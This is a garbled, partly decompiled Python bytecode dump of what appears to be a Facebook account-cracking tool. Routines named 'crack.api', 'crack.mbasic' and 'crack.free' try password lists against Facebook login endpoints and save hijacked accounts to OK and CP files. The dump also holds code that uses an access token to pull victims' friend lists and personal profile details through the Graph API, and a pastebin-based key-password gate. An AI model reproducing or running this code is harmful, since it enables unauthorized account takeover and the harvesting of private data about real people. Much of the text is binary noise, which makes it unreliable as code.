r�  r�  r�   �log�ke�tt�ttlr�  r�   r~   r/   r/   r0   r'  �  sF   
�&. (("("Pz	crack.apic           
      C   s�  �z;|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t
|� d��f	 � | j�d
|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t
|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�r
t
dttt|� d�|t
|� d��f � t
d� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr�  r�   r�  r  r  r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  r�  r<   r�  r"   r�  r�  )rj   r)  ri   rn   r�   rk   rl   rm   r�   r�  r=   re   r�   r�  r  r�   r�  r(   rs   rt   rc   rd   r�  r�  r�   r�  r&   r'   r)   r�  r�  r/   r/   r0   r�  �  sH   
�&. (("("Pzcrack.api_opsic                 C   �  �z@|� d�D �]
}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t
|� d��f	 � | j�d
|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t
|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rdttt|� d�|t
|� d��tf }
t|
t|� d��� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr�  r�   r   r  r  r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  �   
%s[%sOK%s] %s • %s%s%s     r]   r�  r"   r�  r�  ) rj   rM  ri   rn   r�   rk   rl   rm   r�   r�  r=   re   r�   r�  r  r�   r�  r(   rs   rt   rc   rd   r�  r�  r�  r�  r�   r�  r&   r'   r)   r�  �r�  r�  r�   r�  r�  r�  r   r�  r�   r~   r�  r/   r/   r0   r�     �H   
�&. (("&"Pzcrack.mbasicc                 C   s�  �zZ|� d�D �]$}t|� d�|d�}|� d�dkr�zst� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }dt
tt
|� d�||||	t|� d��f	 }
t
|� d�||
� td
� | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q- ttfy�   d}d}d}	Y n   Y dt
tt
|� d�|t|� d��f }
t
|� d�||
� td
� | j�d|� d�|f � tdt d��d|� d�|f �  �q-|� d�dk�r,dttt|� d�|t|� d��tf }t|t|� d��� td
� | j�d|� d�|f � tdt d��d|� d�|f �  �q-q|  jd7  _tdtttt
| jt| j�t
tt| j�t
tt| j�t
tf dd� tj��  W d S    | � |� Y d S )Nr�  r�   r   r  r  r�   r�   rH   r�   r�  r�  r�  r<   r�  r�  r�  r�  r�   r�  r�  r�  r  r  r]   r�  r"   r�  r�  )!rj   rM  ri   rn   r�   rk   rl   rm   r�   r�  re   r�   r�  r�  r=   r  r�   r�  r(   rs   rt   rd   rc   r�  r�  r�  r�  r�   r�  r&   r'   r)   r�  �r�  r�  r�   r�  r�  r�  r   r�  r�   r~   r|  r�  r/   r/   r0   r�  E  �R   
�&* ($"&"Pzcrack.mbasic_opsic                 C   r  )Nr�  r�   �https://free.facebook.comr  r  r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  r  r]   r�  r"   r�  r�  ) rj   rO  ri   rn   r�   rk   rl   rm   r�   r�  r=   re   r�   r�  r  r�   r�  r(   rs   rt   rc   rd   r�  r�  r�  r�  r�   r�  r&   r'   r)   r�  r  r/   r/   r0   r�  o  r  z
crack.freec                 C   s�  �zZ|� d�D �]$}t|� d�|d�}|� d�dkr�zst� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }dt
tt
|� d�||||	t|� d��f	 }
t
|� d�||
� td
� | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q- ttfy�   d}d}d}	Y n   Y dt
tt
|� d�|t|� d��f }
t
|� d�||
� td
� | j�d|� d�|f � tdt d��d|� d�|f �  �q-|� d�dk�r,dttt|� d�|t|� d��tf }t|t|� d��� td
� | j�d|� d�|f � tdt d��d|� d�|f �  �q-q|  jd7  _tdtttt
| jt| j�t
tt| j�t
tt| j�t
tf dd� tj��  W d S    | � |� Y d S )Nr�  r�   r  r  r  r�   r�   rH   r�   r�  r�  r�  r<   r�  r�  r�  r�  r�   r�  r�  r�  r  r  r]   r�  r"   r�  r�  )!rj   rO  ri   rn   r�   rk   rl   rm   r�   r�  re   r�   r�  r�  r=   r  r�   r�  r(   rs   rt   rc   rd   r�  r�  r�  r�  r�   r�  r&   r'   r)   r�  r  r/   r/   r0   r�  �  r  zcrack.free_opsiN)�__name__�
__module__�__qualname__r�  r�  r'  r�  r�  r�  r�  r�  r/   r/   r/   r0   r�   �  s     O$%%*%r�   c               	   C   s�  z	t dd��� } W n ttfy!   tdttttf � t�  Y nw tdt	tt	t
f �}zt�d| d |  �}t
�|j�}W n ttfyW   tdttttf � t�  Y nw z|d }W n
 ttfyk   d	}Y nw z|d
 }W n
 ttfy   d	}Y nw z|d }W n
 ttfy�   d	}Y nw z|d }W n
 ttfy�   d	}Y nw z|d
 }W n
 ttfy�   d	}Y nw z|d }	W n
 ttfy�   d	}	Y nw z|d }
W n
 ttfy�   d	}
Y nw z|d }W n
 ttfy�   d	}Y nw z|d }W n ttf�y   d	}Y nw z|d }
W n ttf�y!   d	}
Y nw z|d }W n ttf�y6   d	}Y nw z|d d }W n ttf�yM   d	}Y nw z|d d }W n ttf�yd   d	}Y nw z|d d }W n ttf�y{   d	}Y nw z|d }W n ttf�y�   d	}Y nw z|d }W n ttf�y�   d	}Y nw tdt
tt
t	|f � tdt
tt
t	|f � tdt
tt
t	|f � tdt
tt
t	|f � tdt
tt
t	|f � tdt
tt
t	|	f � tdt
tt
t	|
f � td t
tt
t	|f � td!t
tt
t	|f � td"t
tt
t	|
f � td#t
tt
t	|f � td$t
tt
t	|f � td%t
tt
t	|f � td&t
tt
t	|f � td't
tt
t	|f � td(t
tt
t	|f � td)� td*t	tt	t
f � t�  d S )+NrH   r�   r�   r�   r�   r�   r�   rG   �-r�   �middle_name�	last_namer�  �genderr  �link�username�religion�relationship_status�significant_other�location�hometown�aboutr  r�   u   %s  [%s•%s] %sFIRST NAME : %su    %s  [%s•%s] %sMIDDLE NAME : %su   %s  [%s•%s] %sLAST NAME : %su   %s  [%s•%s] %sTTL : %su   %s  [%s•%s] %sGENDER : %su   %s  [%s•%s] %sEMAIL : %su   %s  [%s•%s] %sLINK : %su   %s  [%s•%s] %sUSERNAME : %su   %s  [%s•%s] %sRELIGION : %su(   %s  [%s•%s] %sRELATIONSHIP STATUS : %su&   %s  [%s•%s] %sRELATIONSHIP WITH : %su   %s  [%s•%s] %sRESIDENCE : %su$   %s  [%s•%s] %sPLACE OF ORIGIN : %su   %s  [%s•%s] %sABOUT : %su   %s  [%s•%s] %sLOCAL : %sr<   r�   )rn   r�   rs   rt   r1   rf   rd   rg   rb   rc   re   ri   rj   rk   rl   rm   r�   r=   )r|   �idt�zx�zy�nm�nd�nt�nb�ut�gdr"  �lk�us�rg�rl�rls�lc�ht�ab�lor/   r/   r0   r�   �  sr   0&0
r�   c               	   C   s�  t dttttf �} z%tdd��� }t�d| |f �}t�	|j
�}tdtttt|d f � W n tt
fyG   tdttttf � t�  Y nw g }g }t dttttf �}td	ttf � t�d
| ||f �}t�	|j
�}|d D ]	}	|�|	d � qr|D ]K}
z<t�d
|
|f �}t�	|j
�}z|d D ]	}
|�|
d � q�W n
 ty�   td� Y nw td|
dt|�� |��  W q~ ty�   td� Y q~w td� t d� t�  d S )Nr�   rH   r�   z-https://graph.facebook.com/%s?access_token=%sr�   rG   r�   u    %s  [%s•%s] %sTAKE ID LIMIT : z%s  %sr�   r�   r�   z5https://graph.facebook.com/%s/friends?access_token=%sz [!] PRIVATEu     [•]r�   z [!] SPAM ACCOUNTSr�   z	 [ BACK ])rb   rc   rd   re   rn   r�   ri   rj   rk   rl   rm   r=   rs   rt   r1   rf   rg   r�   r�   r5   r�   )r�   r|   �mm�nnr�  �te�limr�  �idir}   r�   �ada2�idi2rN   r/   r/   r0   r�   �  sJ   
����
r�   c               	   C   s
  t �  t�  tdtttf � td� tdttttf � tdttttf � tdttttf �} | dv rDtdttttf � t	�  �n.| dv r�zvt
�d	�}td� td
tttf � td� |D ]
}tdtttt|f � qatd� tdttttf �}td� |dkr�tdttttf � t�  t
�
d
| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W n� ttfy�   tdtttf � Y n�w | dv �rezwt
�d�}td� tdtttf � td� |D ]
}tdtttt|f � q�td� tdttttf �}td� |dk�r#tdttttf � t�  t
�
d| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W n" ttf�yd   tdtttf � Y nw tdttttf � t	�  td� tdttttf � t	�  d S )Nz%s  [ %sCRACK RESULTS %s]r<   z%s  [%s1%s] %sCHECK OK RESULTSz%s  [%s2%s] %sCHECK CP RESULTSr�   r@   rA   rB   �OKz*%s  [%s CRACK RESULTS STORED IN FILE OK%s]u   %s  [%s•%s] %s%su"   %s  [%s•%s] %sENTER FILE NAME : z	cat OK/%szOK/%sz%sr  r�   z.txtu7   
%s  [%s•%s] %sTOTAL CRACK ACCOUNT  %s RESULT %s DATEz%s  [%s NO RESULTS FOUND %s]rK   �CPz,%s  [%s CRACK RESULTS STORED IN CP FILES %s]z	cat CP/%szCP/%su6   
%s  [%s•%s] %sTOTAL CRACK ACCOUNT %s RESULT %s DATEr�   )r5   r>   r1   re   rd   r=   rc   rb   rf   r�   r:   �listdirr�   r;   rn   r�   r�  r�   r�   rs   rt   )�ch�okl�filer�  �ppp�del1�cplr/   r/   r0   r�      sr   

 �


 �
r�   c                 C   s�  d}t �� }|j�dddtd|dddd	d
dtd d
dd�� i }t|jtd d|id�jd�}|�dddi�}g d�}|�	d�D ]}|�d�|v rW|�|�d�|�d�i� q@q@|�| |d�� zt|j
t|�d� |dd�jd�}	W n t jjy�   t
dttttf � Y nw d|jv r�t
d ttttf � d S d!|jv �r#|	�d�}
|
�ddd"i�d }|
�ddd#i�d }|
�ddd$i�d }
||||d%d&|
d'�}t|j
t|
d  |d(�jd�}d)d*� |�	d+�D �}tt|��d,kr�t
d-ttttf � nt
d.tttttt|��f � tt|��D ]}t
d/t|d0 �d1 ||  � �qd S d2t|	�v �rC|	�d3d4d2i��d3�j}t
d5tttt|f � d S t
d6ttttf � d S )7Nz�Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36r+  rP   rC   r  rP  rQ  rR  rS  rT  rU  rV  r,  rO   rW  rR   r�   r0  rX  rY  rE  rZ  rb   rG   r2  rc  rd  Tre  z%s[%s!%s] %sSPAM ACCOUNTSr=  u&   %s[%s•%s] %sACCOUNT OK NO CHECKPOINTr?  r4  r\  rg  r<   rh  ri  r<  c                 S   rk  r/   rl  rm  r/   r/   r0   rp  �  rq  zlog_hasil.<locals>.<listcomp>rr  r^   u   %s[%s•%s] %sONE TAP ACCOUNTu!   %s[%s•%s] %sTHERE IS %s OPTION z   r"   rs  rt  �divr�   z%s[%s!%s] %s%sz %s[%s!%s] %sPASSWORD HAS CHANGED)ri   r  r\   rA  rT   ru  rj   rm   rv  rw  rE  ru   rx  r=   rf   rd   r]   rc   r   r�   re   ry  )rz  r{  r�   r~  r�   r  r�  rF  r�   r�  rX  r�  r�  rg  r�  r�  r�  r�  �ohr/   r/   r0   �	log_hasil[  sx   �&�

�	"�r;  c               	   C   sb  t dtttf � td� tdtttttf � tdttttf �} z	t| d��� }W n t	yF   tdt
tt
tf � t�d� t
�  Y nw tdtttttt|��f � td� |D ]3}|�d	d�}|�d
�}tdtttt|f � zt|d |d
 � W n tjjy�   Y q\w td� q\td� tdttttf � td� tdttttf � t�  d S )Nz.%s  [ %sCHECK CRACK RESULT ACCOUNT OPTIONS %s]r<   u'   %s  [%s•%s] %sEXAMPLE FILE: CP/%s.txtu   %s  [%s•%s] %sFILE : r�   z%s  [%s!%s] %sFILE NOT EXISTING�   u#   %s  [%s•%s] %sACCOUNTS LIMIT : %sr$   r�   u   %s[%s•%s] %sCHECK LOGIN : %sr   r"   u)   %s  [%s•%s] %sCHECKING PROCESS COMPLETEr�   )r1   re   rd   r=   rc   r�  rb   rn   �	readlines�FileNotFoundErrorrf   r*   r+   r�   r   r�   r�   r�   r;  ri   ru   rv   r�   )r�  �	buka_baju�memek�kontol�titidr/   r/   r0   r�   �  s6   �
�

r�   c                   C   s>   t �d� td� t �d� t �d� tdttttf � d S )Nz/echo "  [ CHOOSE LOGIN METHOD ]" | lolcat -a -8r<   z.echo "  [1] LOGIN WITH TOKEN" | lolcat -a -d 2z0echo "  [2] LOGIN WITH COOKIES" | lolcat -a -d 2z%s  [%s0%s] %sEXIT)r:   r;   r=   rc   rd   re   r/   r/   r/   r0   ra   �  s
   


ra   c                   C   sJ   t �d� t �d� t �d� t �d� t �d� tdttttf � d S )Nz4echo "  [1] AZIM VAU USER AGENT" | lolcat -a -d 2 -8z;echo "  [2] CHANGE USER AGENT (MANUAL)" | lolcat -a -d 2 -8z>echo "  [3] CHANGE USER AGENT (ADJUST HP)" | lolcat -a -d 2 -8z2echo "  [4] DELETE USER AGENT" | lolcat -a -d 2 -8z1echo "  [5] CHECK USER AGENT" | lolcat -a -d 2 -8z%s  [%s0%s] %sBACK)r:   r;   r=   re   rd   r/   r/   r/   r0   r�   �  s   




r�   c                   C   sH   t d� t dttttf � t dttttf � t dttttf � d S )Nr<   z%s  [%s1%s] %sAPI METHODz%s  [%s2%s] %sMBASIC METHODz)%s  [%s3%s] %sFREE FB METHOD (NOT FOR BD)�r=   rc   rd   re   r/   r/   r/   r0   r�  �  s   r�  c                	   C   sn   t d� t dtttttttf � t dtttttttf � t dtttttttf � t dttttf � d S )Nr<   z,%s  [%s1%s] %sFAST CRACK %s[%sFEW RESULTS%s]z1%s  [%s2%s] %sSLOW CRACK %s[%sMULTIPLE RESULTS%s]z2%s  [%s3%s] %sCRACK VERY SLOW %s[%sMORE RESULTS%s]z%%s  [%s4%s] %sCOMBINED PASSWORD CRACKrC  r/   r/   r/   r0   r�  �  s
   r�  c                   C   s`   t d� t dttttf � t dtttttf � t dtttttf � t dttttf � d S )Nr<   u#   %s[%s•%s] %sCRACKS IN PROGRESS...u-   %s[%s•%s] %sACCOUNT [OK] SAVED TO OK/%s.txtu-   %s[%s•%s] %sACCOUNT [CP] SAVED TO CP/%s.txtu9   %s[%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES
)r=   rc   rd   re   r�  r/   r/   r/   r0   r�  �  s
   r�  c                  C   s�   zEt �d� t �d�} | j}td� t�  td�}||kr5tdttf � t	�
d� t�d� t
�  W d S tdt � t�d	� t�  W d S  tyZ   td
t � tj��  Y d S w )Nz(https://www.google.com/search?q=Azim+Vauz!https://pastebin.com/raw/Ne3Yziv7r<   z [1;93m	  KEY PASSWORD :[1;92m z%s

	   W E L C O M E   %s:) g      �?r5   z

%s	  WRONG PASSWORD... :( 
z/xdg-open https://t.me/joinchat/VkOiLi-26agwMjE1z-%s	 PLEASE CHECK YOUR INTERNET CONNECTION...!)ri   rj   rm   r=   r>   rb   r1   rc   re   r*   r+   r:   r;   r�   rf   �azimpassrt   r&   rp   )�azim�lulu�hulur/   r/   r0   rD  �  s&   




�rD  c                   C   s6   zt �d� W n   Y zt �d� W d S    Y d S )Nr1  r0  )r:   �mkdirr/   r/   r/   r0   �folder�  s   rI  z$
[1;91mUnable to Install requests !�__main__zgit pull)cri   rB  �base64r&   r:   r!  r*   rw   rk   �uuid�
subprocessrq   r   �concurrent.futuresr   r�  r   ru  r   r   �urllib.parser   rd   rf   rc   r�   r�   �Ure   �NrT   �okr  r   �now�current�year�ta�month�bu�day�har�  �bulanrp   �buTemp�
ValueError�opr�  r�   r�   r�   r�   r�   r�   r�   r�   r1   r3   r5   r>   rg   r�   rh   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r  r)  rM  rO  r�  r�  r�  r�  r�   r�   r�   r�   r;  r�   ra   r�   r�  r�  r�  rD  rI  r;   �ImportErrorr=   r  r/   r/   r/   r0   �<module>   s�   X
�NB
1$&&(>
   W<$;?�


�
